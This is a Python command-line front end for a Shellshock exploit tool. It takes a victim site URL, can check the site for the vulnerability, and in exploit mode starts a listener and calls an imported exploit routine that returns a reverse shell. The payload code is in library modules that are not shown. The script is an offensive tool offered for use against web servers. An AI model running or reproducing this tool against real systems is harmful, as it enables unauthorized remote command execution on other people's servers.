#!/usr/bin/env python

import getopt
import sys
from lib import vulncheck, exploit

URL = ''
Check = False
Exploit = False
Listener = 443

def usage():
    print('Shellshock')
    print('')
    print('')
    print('-h   help       Prints this message')
    print('-u   url        URL of the victim site')
    print('-c   check      Test site for vulnerability')
    print('-e   exploit    Exploits the site with shell shock and returns a shell')
    print('-l   listener   Port to listen on for reverse shell (Default 443)')
    print('')
    print('Example: python shellshock.py -u http://example.com/cgi-bin/vuln.py -c')
    print('Example: python shellshock.py -u http://example.com -e -l 8080')

def main():
    
    global URL
    global Check
    global Exploit
    global Listener
    
    if not len(sys.argv[1:]):
        usage()
        sys.exit()
    
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'hu:cel:', ['help', 'url', 'check', 'exploit', 'listener'])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
        sys.exit()
        
    for o,a in opts:
        if o in ('-h', '--help'):
            usage()
        elif o in ('-u', '--url'):
            URL = a
        elif o in ('-c', '--check'):
            Check = True
        elif o in ('-e', '--exploit'):
            Exploit = True
        elif o in ('-l', '--listener'):
            Listener = a

    if Check == True:
        vulncheck.VulnCheck.urlcheck(URL, Listener)
    else:
        pass
    
    if Exploit == True:
        exploit.Exploit.listener(Listener)
        exploit.Exploit.exploit(URL, Listener)
    else:
        pass
    
main()